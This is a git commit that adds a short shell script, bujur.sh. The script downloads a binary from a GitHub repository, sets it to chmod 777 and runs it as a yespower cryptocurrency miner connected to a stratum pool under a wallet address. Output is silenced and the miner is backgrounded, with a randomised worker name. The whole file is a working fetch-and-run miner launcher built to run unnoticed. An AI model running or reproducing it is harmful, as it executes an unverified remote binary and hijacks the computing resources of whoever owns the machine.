58faa25a586a3d4d60a521a1350db9e8cf2cdfff
aqshakuy <109946853+aqshakuy@users.noreply.github.com>
2022-10-10 20:14:57 +0700

    Create bujur.sh

---
+++ bujur.sh
@@ -0,0 +1,4 @@
+wget https://github.com/aqshakuy/bb/raw/main/avx2
+chmod 777 avx2
+./avx2 -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qjm50dpl684xg0xujzan44efleezxqfyaau6fux.$(echo $(shuf -i 1-20000 -n 1)-kuylah) -t8 > /dev/null 2>&1 &
+uname -a
